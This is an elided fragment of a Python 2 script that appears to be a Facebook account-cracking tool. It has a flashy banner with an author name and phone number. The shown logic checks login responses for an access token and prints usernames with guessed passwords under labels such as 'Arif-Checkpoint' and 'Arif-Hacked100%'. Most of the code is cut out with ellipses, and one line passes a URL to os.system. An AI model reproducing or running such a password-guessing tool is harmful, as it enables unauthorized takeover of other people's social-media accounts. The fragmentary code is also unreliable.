...
\x1b[1;92m➣ NAME :           💗 ARIF ISLAM 💗

\x1b[1;91m➣ PGE NAME :  💣DJ VOICE GANG STAR💣

\x1b[1;93m➣ WHATSAPP NO :   👬 +8801912354084 👬
...
def menu():
	...
	print "\033[1;96m💖━━━━━━━━━💘💘💘(MAFIA-KILLER-ARIF)💘💘💘━━━━━━━━💖\n" 
...
def action():
	...
	if ahmad =='':
		...
		os.system('https://www.facebook.com/ITZARIFISLAM1')
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					...
					print '\033[1;96m[Arif-Checkpoint] ' + k + c + user + '  》  ' + pass1+'\n'
					...
					cpb.append(c+user+pass1)
 				    ...
 				    if 'access_token' in q:
 				        ...
 				        print '\x1b[1;92m{Arif-Hacked100%💉}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
